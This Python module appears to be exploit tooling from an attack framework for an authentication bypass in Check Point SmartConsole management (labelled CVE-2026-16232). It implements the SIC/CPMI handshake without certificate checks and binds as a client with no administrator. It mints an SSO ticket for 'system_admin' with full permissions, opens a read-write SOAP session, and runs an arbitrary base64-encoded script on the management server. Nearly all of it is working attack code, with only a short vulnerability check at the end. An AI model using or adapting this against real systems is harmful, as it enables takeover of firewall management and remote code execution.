#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Check Point FWM/CPMI (SIC) helpers for SmartConsole authentication bypass (CVE-2026-16232)."""

from __future__ import annotations

import re
import socket
import ssl
import struct
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET

FWM_PORT = 18190
CPM_PORT = 19009
SSO_LOWER_NAME = "system_admin"
SYSTEM_DATA_DOMAIN = "41e821a0-3720-11e3-aa6e-0800200c9fde"
BASE_NS = "http://www.checkpoint.com/management/objects/schema/BaseObjects"
DLE_NS = "http://www.checkpoint.com/management/objects/schema/DleServerCoreSvc"
DLE_WEB_NS = "http://www.checkpoint.com/management/objects/schema/DleWebService"
OBJECTS_NS = "http://www.checkpoint.com/management/objects/schema/Objects"
CLASSES_NS = "http://www.checkpoint.com/management/objects/schema/Classes"
CDM_NS = "http://www.checkpoint.com/management/objects/schema/CdmCommandsObjects"

DER_SEQUENCE = 0x30
DER_SET = 0x31
DER_OBJECT_IDENTIFIER = 0x06
DER_UTF8_STRING = 0x0C
DER_PRINTABLE_STRING = 0x13
OID_COMMON_NAME = bytes.fromhex("550403")
OID_ORGANIZATION_NAME = bytes.fromhex("55040a")

CA_REQUEST = None
CRL_ANSWER = None


def _huffman_leaf(atom: bytes) -> bytes:
    return b"".join(
        b"\x03" + bytes((byte + 0x0A,)) if byte <= 3 else bytes((byte,))
        for byte in atom
    )


def _huffman_node_bytes(node: dict) -> bytes:
    if "atom" in node:
        return _huffman_leaf(node["atom"])
    return b"\x02" + _huffman_node_bytes(node["0"]) + b"\x01" + _huffman_node_bytes(node["1"])


def _encoded_fwset(codebook: dict, tree_bits: bytes) -> bytes:
    tree = {}
    for code, atom in codebook.items():
        node = tree
        for bit in code:
            node = node.setdefault(bit, {})
        node["atom"] = atom.encode() if isinstance(atom, str) else atom
    dictionary = _huffman_node_bytes(tree) + b"\x01"
    return dictionary + struct.pack("<I", len(tree_bits)) + tree_bits


def _sic_frame(payload: bytes) -> bytes:
    return struct.pack("!I", len(payload)) + payload


def _der_tlv(tag: int, value: bytes) -> bytes:
    return bytes((tag, len(value))) + value


def _crl_subject_atom(sic_dn: str) -> tuple[str, str]:
    fields = dict(part.split("=", 1) for part in sic_dn.split(","))
    organization = fields["o"].encode()
    common_name = fields["cn"].encode()
    organization_rdn = _der_tlv(
        DER_SET,
        _der_tlv(
            DER_SEQUENCE,
            _der_tlv(DER_OBJECT_IDENTIFIER, OID_ORGANIZATION_NAME)
            + _der_tlv(DER_PRINTABLE_STRING, organization),
        ),
    )
    common_name_rdn = _der_tlv(
        DER_SET,
        _der_tlv(
            DER_SEQUENCE,
            _der_tlv(DER_OBJECT_IDENTIFIER, OID_COMMON_NAME)
            + _der_tlv(DER_UTF8_STRING, common_name),
        ),
    )
    der_name = _der_tlv(DER_SEQUENCE, organization_rdn + common_name_rdn)
    return der_name[::-1].hex(), struct.pack("<I", len(der_name)).hex()


def _crl_request(sic_dn: str) -> bytes:
    subject_atom, subject_len = _crl_subject_atom(sic_dn)
    payload = _encoded_fwset(
        {
            "00": b"\x00",
            "01": b"\x02",
            "10": b"\x01",
            "11000": "dn",
            "11001": "crl_date",
            "11010": "00000000",
            "11011": "dn_len",
            "11100": subject_atom,
            "11101": subject_len,
            "11110": "crl_req",
            "11111": "client_crl_req",
        },
        b"\xfd\x17\xc4\x88\xdd\x95\x8e\xce\x96\x2a\x00",
    )
    return _sic_frame(payload)


def _readn(sock: socket.socket, size: int) -> bytes:
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return data


def _lp_send(sock: socket.socket, data: bytes) -> None:
    sock.sendall(struct.pack("!I", len(data)) + data)


def _lp_recv(sock: socket.socket) -> bytes:
    return _readn(sock, struct.unpack("!I", _readn(sock, 4))[0])


def _client_set(kind: str, extra: str = "") -> str:
    return f"""(
\t:major (1)
\t:minor (0)
\t:authver (536870912)
\t:major_release_version (5)
\t:minor_release_version (0)
\t:cpmi_client_major_ver (9)
\t:cpmi_client_minor_minor (9)
\t:cpmi_client_sp_ver (7)
\t:cpmi_client_hf_ver (0)
\t:cpmi_client_build_num (98)
\t:type ({kind})
\t:timeout (120)
\t:encryption_on (false)
\t:skip_version_check (false)
\t:is_cplauncher (false)
\t:cpmi_client (true)
\t:host (kittysploit)
{extra})"""


def _ca_request() -> bytes:
    return _encoded_fwset(
        {"0": b"\x01", "10": b"\x02", "11": "client_ca_cert_req"},
        b"\x0e\x00",
    )


def _crl_answer() -> bytes:
    return _sic_frame(
        _encoded_fwset(
            {
                "00": b"\x00",
                "010": "client_crl_answer",
                "0110": "crl_req",
                "0111": "crl_answer",
                "10": b"\x02",
                "11": b"\x01",
            },
            b"\xcb\x26\x9f\x02\x00",
        )
    )


class CpmiSession:
    """Minimal CPMI client for bind checks and SSO ticket minting."""

    def __init__(self, host: str, fwm_port: int = FWM_PORT, timeout: float = 15):
        self.host = host
        self.fwm_port = int(fwm_port)
        self.timeout = float(timeout)
        self.dn = ""
        self.sock: ssl.SSLSocket | None = None
        self._req = 0
        self._raw: socket.socket | None = None

    def connect(self) -> None:
        raw = socket.create_connection((self.host, self.fwm_port), timeout=self.timeout)
        raw.settimeout(self.timeout)
        raw.sendall(b"Y\0\0\0\0\0\0A")
        _readn(raw, 4)
        _lp_send(raw, b"CN=Gui_Client\0")
        raw.sendall(b"\0\0\0\1\0")
        self.dn = _lp_recv(raw).rstrip(b"\0").decode()
        for _ in range(struct.unpack("!I", _readn(raw, 4))[0]):
            _lp_recv(raw)
        _lp_send(raw, b"asym_sslca\0")
        _lp_send(raw, _sic_frame(_ca_request()))
        _lp_recv(raw)
        ctx = ssl._create_unverified_context()
        ctx.minimum_version = ctx.maximum_version = ssl.TLSVersion.TLSv1_2
        self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
        self.sock.settimeout(self.timeout)
        self._raw = raw
        self.sock.sendall(_crl_request(self.dn))
        _lp_recv(self.sock)
        self.sock.sendall(_crl_answer())
        _readn(self.sock, 4)
        self.sock.sendall(struct.pack("!III", 12, 0x01010001, 3))
        self._recv()

    def close(self) -> None:
        try:
            if self.sock:
                self.sock.close()
        except OSError:
            pass

    def _recv(self) -> bytes:
        assert self.sock
        header = _readn(self.sock, 12)
        return _readn(self.sock, struct.unpack("!I", header[:4])[0] - 12)

    def send(self, text: str) -> bytes:
        assert self.sock
        self._req += 1
        payload = text.encode() + b"\0"
        body = struct.pack("!IIII", self._req, 0, 2, len(payload)) + payload
        self.sock.sendall(struct.pack("!III", 12 + len(body), 0x01010E02, 3) + body)
        return self._recv()

    def application_bind(self) -> bool:
        extra = '\t:application_login ("CPM Server")\n\t:client_without_administrator (true)\n'
        self.send(_client_set('"SmartView Reporter Client"', extra))
        reply = self.send(
            f"""(
\t:local_bind (0)
\t:token_bind (0)
\t:DN ("{self.dn}")
\t:certificate_bind (1)
\t:application_login ("CPM Server")
\t:client_without_administrator (true)
)
"""
        )
        return b":status (ok)" in reply

    def mint_smartconsole_sso_ticket(self) -> str:
        reply = self.send(
            f"""(
\t:type (command)
\t:subject (gen-sso-token)
\t:body (
\t\t:destination_ip ("inx invalid type (0)")
\t\t:source_addr_type (3)
\t\t:dest_addr_type (1)
\t\t:type (SmartConsole)
\t\t:sso_original_client (SmartConsole
\t\t\t:lower_name ({SSO_LOWER_NAME})
\t\t\t:soap_local_bind (1)
\t\t\t:permissions ("ffffffff|ffffffff|ffffffff")
\t\t)
\t)
\t:no-reply (false)
)
"""
        )
        match = re.search(rb"(?<![0-9a-f])[0-9a-f]{64}(?![0-9a-f])", reply)
        if not match:
            raise RuntimeError("SSO ticket not found in CPMI response")
        return match.group().decode()


def _ssl_context():
    return ssl._create_unverified_context()


def soap_post(
    host: str,
    cpm_port: int,
    service: str,
    body: bytes,
    *,
    timeout: float = 15,
    sid: str = "",
    client_sid: str = "",
) -> bytes:
    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": '""',
        "DLESESSIONID": sid,
        "CLIENTSESSIONID": client_sid,
    }
    request = urllib.request.Request(
        f"https://{host}:{cpm_port}/cpmws/{service}",
        body,
        headers=headers,
        method="POST",
    )
    try:
        return urllib.request.urlopen(request, context=_ssl_context(), timeout=timeout).read()
    except urllib.error.HTTPError as error:
        raise RuntimeError(
            ET.fromstring(error.read()).findtext(".//faultstring") or f"HTTP {error.code}"
        ) from error


def redeem_smartconsole_ticket(host: str, ticket: str, cpm_port: int = CPM_PORT, timeout: float = 15):
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<login xmlns="{BASE_NS}">
<applicationName>SmartConsole</applicationName>
<domainUuid>{SYSTEM_DATA_DOMAIN}</domainUuid>
<ssoTicket>
<lowerName>{SSO_LOWER_NAME}</lowerName>
<ticket>{ticket}</ticket>
</ssoTicket>
<mode>READ_WRITE</mode>
<readOnly>false</readOnly>
<clientVersion>0</clientVersion>
<applicationType>SmartConsole</applicationType>
<sessionMode>START_NEW</sessionMode>
<sessionType>PRIVATE</sessionType>
</login>
</soap:Body>
</soap:Envelope>""".encode()
    root = ET.fromstring(soap_post(host, cpm_port, "LoginSvcRemote", body, timeout=timeout))
    sid = root.findtext(f".//{{{DLE_NS}}}sid")
    client_sid = root.findtext(f".//{{{DLE_NS}}}clientSessionId")
    if not sid or not client_sid:
        raise RuntimeError("SmartConsole ticket redemption failed")
    return sid, client_sid


def management_mirror_uid(host: str, sid: str, client_sid: str, cpm_port: int = CPM_PORT, timeout: float = 15) -> str:
    body = b"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<query xmlns="http://www.checkpoint.com/DleWebService/QuerySvcRemote">
<queryName>NGM_INTERFACES_SUPPORTED_OBJECTS</queryName>
<maxReturns>10</maxReturns>
<fromIndex>0</fromIndex>
<fullObjects>true</fullObjects>
</query>
</soap:Body>
</soap:Envelope>"""
    root = ET.fromstring(soap_post(host, cpm_port, "QuerySvcRemote", body, sid=sid, client_sid=client_sid, timeout=timeout))
    results = root.findall(f".//{{{DLE_WEB_NS}}}resultList")
    if not results:
        raise RuntimeError("management mirror query returned no objects")
    primary = None
    for node in results:
        if node.findtext(f"{{{CLASSES_NS}}}primaryManagement") == "true":
            primary = node
            break
    target = primary or results[0]
    uid = target.findtext(f"{{{BASE_NS}}}objId")
    if not uid:
        raise RuntimeError("management mirror missing objId")
    return uid


def run_local_script(
    host: str,
    gateway_uid: str,
    script: str,
    sid: str,
    client_sid: str,
    cpm_port: int = CPM_PORT,
    timeout: float = 15,
) -> bool:
    import base64
    import secrets

    txn = secrets.randbelow(2_000_000_000)
    script_b64 = base64.b64encode(script.encode()).decode().replace("\n", "")
    label = secrets.token_hex(8)
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:cdm="{CDM_NS}" xmlns:base="{BASE_NS}">
<soap:Body>
<executeCommand xmlns="http://www.checkpoint.com/DleWebService/ExecuteCommandSvcRemote">
<commandName>Run Script</commandName>
<administratorName>system_admin</administratorName>
<targetUid>{gateway_uid}</targetUid>
<isLocal>true</isLocal>
<runOnMgmt>true</runOnMgmt>
<transactionId>{txn}</transactionId>
<clientTransactionId>0</clientTransactionId>
<deleteAfterRun>true</deleteAfterRun>
<cdm:scriptBody>{script_b64}</cdm:scriptBody>
<cdm:scriptName>{label}</cdm:scriptName>
<cdm:scriptType>OneTime</cdm:scriptType>
</executeCommand>
</soap:Body>
</soap:Envelope>""".encode()
    root = ET.fromstring(
        soap_post(host, cpm_port, "ExecuteCommandSvcRemote", body, sid=sid, client_sid=client_sid, timeout=timeout)
    )
    valid = root.findtext(f".//{{{CDM_NS}}}valid")
    return (valid or "").lower() == "true"


def cpmi_bind_check(host: str, fwm_port: int = FWM_PORT, timeout: float = 12) -> tuple[bool, str]:
    """Return (vulnerable_bind, sic_dn_or_error)."""
    session = CpmiSession(host, fwm_port=fwm_port, timeout=timeout)
    try:
        session.connect()
        ok = session.application_bind()
        return ok, session.dn
    except Exception as exc:
        return False, str(exc)
    finally:
        session.close()